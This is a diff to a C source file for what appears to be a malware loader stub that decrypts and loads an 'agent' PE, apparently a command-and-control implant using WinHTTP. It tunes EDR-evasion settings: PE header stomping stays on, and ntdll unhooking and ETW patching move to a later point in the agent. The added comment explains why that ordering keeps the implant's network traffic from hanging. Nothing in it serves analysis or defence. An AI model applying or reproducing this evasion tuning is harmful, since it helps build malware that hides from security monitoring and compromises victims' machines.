@@ -28,13 +28,23 @@
 /* ─── Generated per-build: encrypted payload + seed ─── */
 #include "stub_payload.h"
 
-/* ─── Evasion toggles: enable one at a time to isolate issues ─── */
-#define EVASION_STOMP   1   /* MZ/PE signature stomp in _load_pe       */
-#define EVASION_UNHOOK  1   /* ntdll .text unhooking                   */
-#define EVASION_ETW     0   /* EtwEventWrite patch                     */
-
-/* Legacy macro — leave at 0, individual toggles above take over */
-#define STUB_EVASION_ENABLED 0
+/* ─── Evasion toggles ───
+ *
+ * UNHOOK and ETW must stay OFF in the stub.  Both patch ntdll BEFORE
+ * the agent PE is loaded, which means BEFORE winhttp.dll, schannel.dll
+ * and other DLLs run their DllMain.  Those DLLs need functional ntdll
+ * (EtwEventWrite, unpatched syscall stubs) during initialisation;
+ * patching first causes WinHttpSendRequest to hang indefinitely.
+ *
+ * The agent already does both in evasion_runtime.c AFTER all imports
+ * are resolved and DLLs initialised — that is the correct timing.
+ *
+ * STOMP is safe here because it only touches the agent PE headers
+ * after the load is complete.
+ */
+#define EVASION_STOMP   1   /* MZ/PE signature stomp — safe post-load  */
+#define EVASION_UNHOOK  0   /* DO NOT ENABLE — breaks WinHTTP (see above) */
+#define EVASION_ETW     0   /* DO NOT ENABLE — breaks WinHTTP (see above) */
 
 
 /* ═══════════════════════════════════════════════════════════════════
